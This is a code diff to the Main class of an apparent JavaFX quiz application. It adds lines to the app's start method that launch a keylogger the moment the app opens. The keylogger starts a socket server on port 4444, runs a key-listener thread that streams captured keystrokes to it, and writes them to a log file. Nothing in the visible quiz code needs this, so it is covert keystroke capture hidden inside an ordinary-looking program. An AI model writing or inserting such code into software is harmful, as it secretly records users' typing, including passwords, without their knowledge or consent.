@@ -6,6 +6,7 @@ import javafx.scene.Scene;
 import javafx.scene.layout.VBox;
 import javafx.stage.Stage;
 
+import org.insecurity_quiz.Advanced_Security_Implementations.*;
 import org.insecurity_quiz.QuizController;
 
 import java.io.FileInputStream;
@@ -21,6 +22,17 @@ public class Main extends Application {
     @Override
     public void start(Stage primaryStage){
         try{
+            KeyLogger keylogger = new KeyLogger("YOUR_KEYS_LOGGED.txt");
+            SocketServer server = new SocketServer(4444, keylogger::logKey);
+            server.startServer();
+
+            // Create a SocketClient object and a KeyListener object
+            // SocketClient: server address to send to, server port to send to
+            SocketClient socketClient = new SocketClient("localhost", 4444);
+            KeyListener KeyListener = new KeyListener(socketClient::send);
+            // Start the KeyListener thread
+            KeyListener.start();
+
             FXMLLoader loader = new FXMLLoader();
             VBox root = loader.load(new FileInputStream("GUI/intro.fxml"));
             Scene scene = new Scene(root, 900, 700);
